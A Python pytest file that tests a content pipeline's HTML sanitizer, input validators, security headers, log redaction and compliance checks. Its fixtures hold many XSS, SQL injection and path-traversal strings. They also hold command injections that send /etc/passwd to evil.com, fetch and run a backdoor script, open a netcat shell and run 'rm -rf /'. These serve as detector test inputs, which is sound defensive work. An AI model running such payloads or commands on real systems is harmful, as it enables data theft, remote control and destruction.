"""
Security tests for input validation and sanitization.

Tests content sanitization, input validation, and XSS prevention.
"""

import pytest
from typing import Dict, List
from unittest.mock import patch

from security.content_sanitizer import ContentSanitizer
from security.input_validator import InputValidator
from pipelines.normalize.html_cleaner import HTMLCleaner


class TestContentSanitization:
    """Test content sanitization against XSS and injection attacks."""
    
    @pytest.fixture
    def content_sanitizer(self):
        """Create ContentSanitizer instance for testing."""
        return ContentSanitizer()
    
    @pytest.fixture
    def malicious_html_samples(self):
        """Sample malicious HTML content for testing."""
        return [
            # Script injection
            '<script>alert("XSS")</script>',
            '<script src="https://evil.com/malicious.js"></script>',
            '<img src="x" onerror="alert(\'XSS\')">',
            '<svg onload="alert(\'XSS\')">',
            
            # Event handler injection
            '<div onclick="alert(\'XSS\')">Click me</div>',
            '<a href="javascript:alert(\'XSS\')">Link</a>',
            '<form action="javascript:alert(\'XSS\')">',
            '<iframe src="javascript:alert(\'XSS\')"></iframe>',
            
            # Style-based attacks
            '<div style="background:url(javascript:alert(\'XSS\'))">',
            '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
            '<style>@import "javascript:alert(\'XSS\')"</style>',
            
            # Data URI attacks
            '<img src="data:text/html,<script>alert(\'XSS\')</script>">',
            '<object data="data:text/html,<script>alert(\'XSS\')</script>">',
            
            # Protocol-based attacks
            '<a href="vbscript:msgbox(\'XSS\')">VBScript</a>',
            '<a href="data:text/html,<script>alert(\'XSS\')</script>">Data URI</a>',
            
            # HTML entity encoding bypasses
            '&lt;script&gt;alert("XSS")&lt;/script&gt;',
            '&#60;script&#62;alert("XSS")&#60;/script&#62;',
            
            # CSS injection
            '<style>body{background:url("javascript:alert(\'XSS\')")}</style>',
            '<div style="expression(alert(\'XSS\'))">IE Expression</div>',
            
            # Meta tag injection
            '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
            
            # Form-based attacks
            '<input type="hidden" name="redirect" value="javascript:alert(\'XSS\')">',
            '<textarea>javascript:alert(\'XSS\')</textarea>',
            
            # SVG-based attacks
            '<svg><g onload="alert(\'XSS\')"></g></svg>',
            '<svg><animateTransform onbegin="alert(\'XSS\')"></svg>',
            
            # Object/embed attacks
            '<object type="text/html" data="javascript:alert(\'XSS\')">',
            '<embed src="javascript:alert(\'XSS\')">',
            
            # Mixed content attacks
            '<div><script>alert("XSS")</script><p>Normal content</p></div>',
            'Normal text <img src="x" onerror="alert(\'XSS\')"> more text',
        ]
    
    @pytest.mark.security
    def test_script_tag_removal(self, content_sanitizer, malicious_html_samples):
        """Test removal of script tags and script-based attacks."""
        script_samples = [
            sample for sample in malicious_html_samples 
            if '<script' in sample.lower() or 'javascript:' in sample.lower()
        ]
        
        for malicious_html in script_samples:
            sanitized = content_sanitizer.sanitize_html(malicious_html)
            
            # Should remove all script tags
            assert '<script' not in sanitized.lower()
            assert '</script>' not in sanitized.lower()
            assert 'javascript:' not in sanitized.lower()
            assert 'vbscript:' not in sanitized.lower()
            
            # Should not contain alert functions
            assert 'alert(' not in sanitized
            assert 'confirm(' not in sanitized
            assert 'prompt(' not in sanitized
    
    @pytest.mark.security
    def test_event_handler_removal(self, content_sanitizer):
        """Test removal of dangerous event handlers."""
        dangerous_events = [
            'onclick', 'onmouseover', 'onload', 'onerror', 'onsubmit',
            'onfocus', 'onblur', 'onchange', 'onkeypress', 'onkeydown',
            'onbegin', 'onend', 'onrepeat', 'onabort'
        ]
        
        for event in dangerous_events:
            malicious_html = f'<div {event}="alert(\'XSS\')">Content</div>'
            sanitized = content_sanitizer.sanitize_html(malicious_html)
            
            # Should remove the event handler
            assert f'{event}=' not in sanitized.lower()
            
            # Should preserve safe content
            assert 'Content' in sanitized
    
    @pytest.mark.security
    def test_dangerous_attribute_removal(self, content_sanitizer):
        """Test removal of dangerous HTML attributes."""
        dangerous_attributes = [
            ('href', 'javascript:alert("XSS")'),
            ('src', 'javascript:alert("XSS")'),
            ('action', 'javascript:alert("XSS")'),
            ('formaction', 'javascript:alert("XSS")'),
            ('data', 'javascript:alert("XSS")'),
            ('style', 'background:url(javascript:alert("XSS"))'),
            ('style', 'expression(alert("XSS"))'),
        ]
        
        for attr, value in dangerous_attributes:
            malicious_html = f'<div {attr}="{value}">Content</div>'
            sanitized = content_sanitizer.sanitize_html(malicious_html)
            
            # Should remove dangerous attribute values
            assert 'javascript:' not in sanitized.lower()
            assert 'expression(' not in sanitized.lower()
            assert 'vbscript:' not in sanitized.lower()
            
            # Should preserve safe content
            assert 'Content' in sanitized
    
    @pytest.mark.security
    def test_dangerous_tag_removal(self, content_sanitizer):
        """Test removal of dangerous HTML tags."""
        dangerous_tags = [
            'script', 'object', 'embed', 'applet', 'meta', 'link',
            'style', 'iframe', 'frame', 'frameset', 'base'
        ]
        
        for tag in dangerous_tags:
            malicious_html = f'<{tag}>Dangerous content</{tag}>'
            sanitized = content_sanitizer.sanitize_html(malicious_html)
            
            # Should remove dangerous tags
            assert f'<{tag}' not in sanitized.lower()
            assert f'</{tag}>' not in sanitized.lower()
    
    @pytest.mark.security
    def test_data_uri_sanitization(self, content_sanitizer):
        """Test sanitization of data URIs."""
        data_uri_attacks = [
            '<img src="data:text/html,<script>alert(\'XSS\')</script>">',
            '<img src="data:image/svg+xml,<svg onload=alert(\'XSS\')>">',
            '<iframe src="data:text/html,<script>alert(\'XSS\')</script>"></iframe>',
            '<object data="data:text/html,<script>alert(\'XSS\')</script>"></object>'
        ]
        
        for attack in data_uri_attacks:
            sanitized = content_sanitizer.sanitize_html(attack)
            
            # Should remove or neutralize data URIs with scripts
            assert 'data:text/html' not in sanitized or 'script' not in sanitized.lower()
            assert 'onload=' not in sanitized.lower()
            assert 'alert(' not in sanitized
    
    @pytest.mark.security
    def test_css_injection_prevention(self, content_sanitizer):
        """Test prevention of CSS-based injection attacks."""
        css_attacks = [
            '<style>body{background:url("javascript:alert(\'XSS\')")}</style>',
            '<div style="background:url(javascript:alert(\'XSS\'))">Content</div>',
            '<div style="expression(alert(\'XSS\'))">IE Expression</div>',
            '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
            '<style>@import "javascript:alert(\'XSS\')"</style>'
        ]
        
        for attack in css_attacks:
            sanitized = content_sanitizer.sanitize_html(attack)
            
            # Should remove dangerous CSS
            assert 'javascript:' not in sanitized.lower()
            assert 'expression(' not in sanitized.lower()
            assert '@import' not in sanitized.lower() or 'javascript:' not in sanitized.lower()
    
    @pytest.mark.security
    def test_svg_security(self, content_sanitizer):
        """Test SVG sanitization for security."""
        svg_attacks = [
            '<svg onload="alert(\'XSS\')">',
            '<svg><g onload="alert(\'XSS\')"></g></svg>',
            '<svg><animateTransform onbegin="alert(\'XSS\')"></svg>',
            '<svg><script>alert("XSS")</script></svg>',
            '<svg><foreignObject><script>alert("XSS")</script></foreignObject></svg>'
        ]
        
        for attack in svg_attacks:
            sanitized = content_sanitizer.sanitize_html(attack)
            
            # Should remove dangerous SVG content
            assert 'onload=' not in sanitized.lower()
            assert 'onbegin=' not in sanitized.lower()
            assert '<script' not in sanitized.lower()
            assert 'alert(' not in sanitized
    
    @pytest.mark.security
    def test_html_entity_bypass_prevention(self, content_sanitizer):
        """Test prevention of HTML entity encoding bypasses."""
        entity_bypasses = [
            '&lt;script&gt;alert("XSS")&lt;/script&gt;',
            '&#60;script&#62;alert("XSS")&#60;/script&#62;',
            '&#x3C;script&#x3E;alert("XSS")&#x3C;/script&#x3E;',
            '&amp;lt;script&amp;gt;alert("XSS")&amp;lt;/script&amp;gt;'
        ]
        
        for bypass in entity_bypasses:
            sanitized = content_sanitizer.sanitize_html(bypass)
            
            # After decoding, should not contain dangerous content
            import html
            decoded = html.unescape(sanitized)
            assert '<script' not in decoded.lower() or 'alert(' not in decoded
    
    @pytest.mark.security
    def test_preserve_safe_content(self, content_sanitizer):
        """Test that safe content is preserved during sanitization."""
        safe_html = """
        <div class="article">
            <h1>Article Title</h1>
            <p>This is a <strong>safe</strong> paragraph with <em>formatting</em>.</p>
            <ul>
                <li>Safe list item 1</li>
                <li>Safe list item 2</li>
            </ul>
            <blockquote>This is a safe quote.</blockquote>
            <a href="https://example.com">Safe external link</a>
            <img src="https://example.com/image.jpg" alt="Safe image">
            <code>safe_code_snippet()</code>
        </div>
        """
        
        sanitized = content_sanitizer.sanitize_html(safe_html)
        
        # Should preserve safe content
        assert 'Article Title' in sanitized
        assert '<strong>safe</strong>' in sanitized or 'safe' in sanitized
        assert '<em>formatting</em>' in sanitized or 'formatting' in sanitized
        assert 'Safe list item' in sanitized
        assert 'safe quote' in sanitized
        assert 'https://example.com' in sanitized
        assert 'safe_code_snippet' in sanitized
    
    @pytest.mark.security
    def test_comprehensive_xss_payload_protection(self, content_sanitizer):
        """Test against comprehensive XSS payload collection."""
        # Common XSS payloads from security testing
        xss_payloads = [
            '<script>alert("XSS")</script>',
            'javascript:alert("XSS")',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '<iframe src=javascript:alert("XSS")></iframe>',
            '<body onload=alert("XSS")>',
            '<input onfocus=alert("XSS") autofocus>',
            '<select onfocus=alert("XSS") autofocus>',
            '<textarea onfocus=alert("XSS") autofocus>',
            '<keygen onfocus=alert("XSS") autofocus>',
            '<video><source onerror=alert("XSS")>',
            '<audio src=x onerror=alert("XSS")>',
            '<details open ontoggle=alert("XSS")>',
            '<marquee onstart=alert("XSS")>',
            '"><script>alert("XSS")</script>',
            '\';alert("XSS");//',
            '"><img src=x onerror=alert("XSS")>',
            '</script><script>alert("XSS")</script>'
        ]
        
        for payload in xss_payloads:
            sanitized = content_sanitizer.sanitize_html(payload)
            
            # Should not contain any executable JavaScript
            assert 'alert(' not in sanitized
            assert 'confirm(' not in sanitized
            assert 'prompt(' not in sanitized
            assert 'javascript:' not in sanitized.lower()
            assert '<script' not in sanitized.lower()
            
            # Should not contain dangerous event handlers
            dangerous_events = ['onload', 'onerror', 'onfocus', 'onstart', 'ontoggle']
            for event in dangerous_events:
                assert f'{event}=' not in sanitized.lower()


class TestInputValidation:
    """Test input validation for various data types."""
    
    @pytest.fixture
    def input_validator(self):
        """Create InputValidator instance for testing."""
        return InputValidator()
    
    @pytest.mark.security
    def test_url_validation(self, input_validator):
        """Test URL validation against malicious URLs."""
        # Valid URLs
        valid_urls = [
            'https://example.com',
            'https://example.com/path',
            'https://example.com/path?param=value',
            'https://subdomain.example.com',
            'http://localhost:8000',
            'https://example.com:443/secure'
        ]
        
        for url in valid_urls:
            assert input_validator.validate_url(url) is True, f"Valid URL rejected: {url}"
        
        # Invalid/malicious URLs
        invalid_urls = [
            'javascript:alert("XSS")',
            'data:text/html,<script>alert("XSS")</script>',
            'vbscript:msgbox("XSS")',
            'file:///etc/passwd',
            'ftp://malicious.com/file',
            'tel:+1234567890',  # May be invalid depending on context
            '//evil.com/redirect',
            'https://evil.com@good.com',  # Potential phishing
            'https://user:pass@evil.com',
            'not-a-url',
            '',
            None
        ]
        
        for url in invalid_urls:
            assert input_validator.validate_url(url) is False, f"Invalid URL accepted: {url}"
    
    @pytest.mark.security
    def test_email_validation(self, input_validator):
        """Test email validation against injection attacks."""
        # Valid emails
        valid_emails = [
            'user@example.com',
            'user.name@example.com',
            'user+tag@example.com',
            'user123@example-site.com',
            'admin@subdomain.example.org'
        ]
        
        for email in valid_emails:
            assert input_validator.validate_email(email) is True, f"Valid email rejected: {email}"
        
        # Invalid/malicious emails
        invalid_emails = [
            'user@example.com<script>alert("XSS")</script>',
            'user@example.com"; DROP TABLE users; --',
            'user@javascript:alert("XSS")',
            'user@@example.com',
            'user@',
            '@example.com',
            'not-an-email',
            'user@.com',
            'user@com',
            '',
            None
        ]
        
        for email in invalid_emails:
            assert input_validator.validate_email(email) is False, f"Invalid email accepted: {email}"
    
    @pytest.mark.security
    def test_filename_validation(self, input_validator):
        """Test filename validation against path traversal attacks."""
        # Valid filenames
        valid_filenames = [
            'document.pdf',
            'image.jpg',
            'article-2024.md',
            'data_file.csv',
            'presentation.pptx'
        ]
        
        for filename in valid_filenames:
            assert input_validator.validate_filename(filename) is True, f"Valid filename rejected: {filename}"
        
        # Invalid/malicious filenames
        invalid_filenames = [
            '../../../etc/passwd',
            '..\\..\\windows\\system32\\config\\sam',
            '/etc/passwd',
            '\\windows\\system32\\config\\sam',
            'file.exe',
            'script.sh',
            'file.php',
            'document.pdf.exe',
            'file<script>alert("XSS")</script>.txt',
            'file"; rm -rf /; ".txt',
            'CON.txt',  # Windows reserved name
            'PRN.txt',  # Windows reserved name
            'file\x00.txt',  # Null byte injection
            'very_long_filename_' + 'a' * 300 + '.txt',  # Extremely long filename
            '',
            None
        ]
        
        for filename in invalid_filenames:
            assert input_validator.validate_filename(filename) is False, f"Invalid filename accepted: {filename}"
    
    @pytest.mark.security
    def test_sql_injection_detection(self, input_validator):
        """Test detection of SQL injection attempts."""
        # Safe inputs
        safe_inputs = [
            'normal text input',
            'article about AI and ML',
            "user's guide to programming",
            'data-science-2024',
            '123456'
        ]
        
        for safe_input in safe_inputs:
            assert input_validator.contains_sql_injection(safe_input) is False, f"Safe input flagged as SQL injection: {safe_input}"
        
        # SQL injection attempts
        sql_injections = [
            "'; DROP TABLE articles; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "1; DELETE FROM articles;",
            "admin'--",
            "' OR 1=1 --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
            "'; EXEC sp_configure 'show advanced options', 1; --",
            "1' WAITFOR DELAY '00:00:05' --"
        ]
        
        for injection in sql_injections:
            assert input_validator.contains_sql_injection(injection) is True, f"SQL injection not detected: {injection}"
    
    @pytest.mark.security
    def test_command_injection_detection(self, input_validator):
        """Test detection of command injection attempts."""
        # Safe inputs
        safe_inputs = [
            'normal filename.txt',
            'user input data',
            'programming-guide.md',
            '2024-01-15'
        ]
        
        for safe_input in safe_inputs:
            assert input_validator.contains_command_injection(safe_input) is False, f"Safe input flagged as command injection: {safe_input}"
        
        # Command injection attempts
        command_injections = [
            '; rm -rf /',
            '&& rm -rf /',
            '| cat /etc/passwd',
            '; cat /etc/passwd',
            '`cat /etc/passwd`',
            '$(cat /etc/passwd)',
            '; nc -l -p 4444 -e /bin/sh',
            '&& curl evil.com/steal.php?data=$(cat /etc/passwd)',
            '| wget http://evil.com/backdoor.sh && chmod +x backdoor.sh && ./backdoor.sh',
            '; echo "hacked" > /tmp/pwned.txt'
        ]
        
        for injection in command_injections:
            assert input_validator.contains_command_injection(injection) is True, f"Command injection not detected: {injection}"
    
    @pytest.mark.security
    def test_path_traversal_detection(self, input_validator):
        """Test detection of path traversal attempts."""
        # Safe paths
        safe_paths = [
            'articles/ai-guide.md',
            'images/diagram.png',
            'data/2024/statistics.json',
            'documents/user-manual.pdf'
        ]
        
        for safe_path in safe_paths:
            assert input_validator.contains_path_traversal(safe_path) is False, f"Safe path flagged as traversal: {safe_path}"
        
        # Path traversal attempts
        path_traversals = [
            '../../../etc/passwd',
            '..\\..\\windows\\system32\\config\\sam',
            '/etc/passwd',
            '\\windows\\system32\\config\\sam',
            'articles/../../../etc/passwd',
            'data/../../sensitive/file.txt',
            '..\\..\\..\\sensitive\\data.txt',
            '/var/www/html/../../../../etc/passwd',
            '....//....//....//etc/passwd',  # Double encoding
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'  # URL encoded
        ]
        
        for traversal in path_traversals:
            assert input_validator.contains_path_traversal(traversal) is True, f"Path traversal not detected: {traversal}"


class TestSecureConfiguration:
    """Test security configuration and headers."""
    
    @pytest.mark.security
    def test_content_security_policy(self):
        """Test Content Security Policy configuration."""
        from security.security_headers import SecurityHeaders
        
        security_headers = SecurityHeaders()
        csp_header = security_headers.get_content_security_policy()
        
        # Should have restrictive CSP
        assert 'default-src' in csp_header
        assert "'unsafe-inline'" not in csp_header or 'script-src' in csp_header
        assert "'unsafe-eval'" not in csp_header
        assert 'script-src' in csp_header
        assert 'style-src' in csp_header
        assert 'img-src' in csp_header
        
        # Should prevent data: URIs for scripts
        if 'data:' in csp_header:
            assert 'script-src' not in csp_header or 'data:' not in csp_header.split('script-src')[1].split(';')[0]
    
    @pytest.mark.security
    def test_security_headers_presence(self):
        """Test presence of required security headers."""
        from security.security_headers import SecurityHeaders
        
        security_headers = SecurityHeaders()
        headers = security_headers.get_all_headers()
        
        required_headers = [
            'X-Content-Type-Options',
            'X-Frame-Options',
            'X-XSS-Protection',
            'Strict-Transport-Security',
            'Content-Security-Policy',
            'Referrer-Policy'
        ]
        
        for header in required_headers:
            assert header in headers, f"Required security header missing: {header}"
        
        # Check header values
        assert headers['X-Content-Type-Options'] == 'nosniff'
        assert headers['X-Frame-Options'] in ['DENY', 'SAMEORIGIN']
        assert 'max-age' in headers['Strict-Transport-Security']
    
    @pytest.mark.security
    def test_sensitive_data_exposure(self):
        """Test for exposure of sensitive data in logs or responses."""
        from pipelines.logging_config import get_logger
        
        # Test that sensitive data is not logged
        logger = get_logger(__name__)
        
        # Mock log handler to capture log messages
        log_messages = []
        
        class MockHandler:
            def emit(self, record):
                log_messages.append(record.getMessage())
        
        mock_handler = MockHandler()
        logger.addHandler(mock_handler)
        
        # Test logging with sensitive data
        sensitive_data = {
            'api_key': 'sk-1234567890abcdef',
            'password': 'secret_password_123',
            'token': 'jwt_token_xyz789',
            'credit_card': '4111-1111-1111-1111'
        }
        
        logger.info(f"Processing data: {sensitive_data}")
        
        # Check that sensitive values are not in logs
        for message in log_messages:
            assert 'sk-1234567890abcdef' not in message
            assert 'secret_password_123' not in message
            assert 'jwt_token_xyz789' not in message
            assert '4111-1111-1111-1111' not in message
        
        logger.removeHandler(mock_handler)


class TestComplianceValidation:
    """Test compliance with security standards and regulations."""
    
    @pytest.mark.security
    def test_gdpr_compliance_checks(self):
        """Test GDPR compliance requirements."""
        from security.compliance_checker import ComplianceChecker
        
        compliance_checker = ComplianceChecker()
        
        # Test data processing checks
        test_user_data = {
            'email': 'user@example.com',
            'name': 'Test User',
            'preferences': {'newsletter': True},
            'ip_address': '192.168.1.1',
            'user_agent': 'Mozilla/5.0...'
        }
        
        compliance_result = compliance_checker.check_gdpr_compliance(test_user_data)
        
        # Should identify personal data
        assert compliance_result['has_personal_data'] is True
        assert 'email' in compliance_result['personal_data_fields']
        assert 'ip_address' in compliance_result['personal_data_fields']
        
        # Should require consent tracking
        assert compliance_result['requires_consent'] is True
        
        # Should have data retention policy
        assert 'data_retention_days' in compliance_result
        assert compliance_result['data_retention_days'] > 0
    
    @pytest.mark.security
    def test_data_anonymization(self):
        """Test data anonymization for privacy protection."""
        from security.data_anonymizer import DataAnonymizer
        
        anonymizer = DataAnonymizer()
        
        # Test personal data anonymization
        personal_data = {
            'name': 'John Smith',
            'email': 'john.smith@example.com',
            'phone': '+1-555-123-4567',
            'ip_address': '192.168.1.100',
            'user_id': 'user_12345'
        }
        
        anonymized = anonymizer.anonymize_personal_data(personal_data)
        
        # Should not contain original personal data
        assert anonymized['name'] != 'John Smith'
        assert anonymized['email'] != 'john.smith@example.com'
        assert anonymized['phone'] != '+1-555-123-4567'
        assert anonymized['ip_address'] != '192.168.1.100'
        
        # Should preserve data structure
        assert 'name' in anonymized
        assert 'email' in anonymized
        assert 'phone' in anonymized
        assert 'ip_address' in anonymized
        assert 'user_id' in anonymized
    
    @pytest.mark.security
    def test_copyright_detection(self):
        """Test copyright content detection."""
        from security.content_sanitizer import ContentSanitizer
        
        sanitizer = ContentSanitizer()
        
        # Test content with potential copyright issues
        test_contents = [
            "This is original content created for testing purposes.",
            "© 2024 Example Corp. All rights reserved. This is copyrighted material.",
            "Content from Wikipedia: Machine learning is a method of data analysis...",
            "Excerpt from 'AI Handbook' by Famous Author, published 2023.",
            "This content is licensed under Creative Commons CC-BY-SA."
        ]
        
        for content in test_contents:
            copyright_result = sanitizer.detect_copyright_issues(content)
            
            # Should identify potential copyright content
            if '©' in content or 'All rights reserved' in content:
                assert copyright_result['has_copyright_notice'] is True
            
            if 'from Wikipedia' in content:
                assert copyright_result['potential_source'] is not None
            
            if 'Creative Commons' in content:
                assert copyright_result['has_license'] is True
    
    @pytest.mark.security
    def test_content_filtering_compliance(self):
        """Test content filtering for compliance requirements."""
        from security.content_filter import ContentFilter
        
        content_filter = ContentFilter()
        
        # Test content that should be filtered
        inappropriate_content = [
            "Content with profanity: This is damn inappropriate content.",
            "Spam content: BUY NOW!!! CLICK HERE!!! AMAZING DEAL!!!",
            "Personal information: My SSN is 123-45-6789 and phone is 555-1234.",
            "Potentially harmful: Instructions for making explosives...",
            "Adult content: Explicit sexual material not suitable for general audience."
        ]
        
        for content in inappropriate_content:
            filter_result = content_filter.should_filter_content(content)
            
            # Should identify problematic content
            assert filter_result['should_filter'] is True
            assert len(filter_result['reasons']) > 0
            
            # Should provide specific reasons
            if 'profanity' in content.lower():
                assert 'profanity' in filter_result['categories']
            if 'BUY NOW' in content:
                assert 'spam' in filter_result['categories']
            if 'SSN' in content or 'phone' in content:
                assert 'personal_info' in filter_result['categories']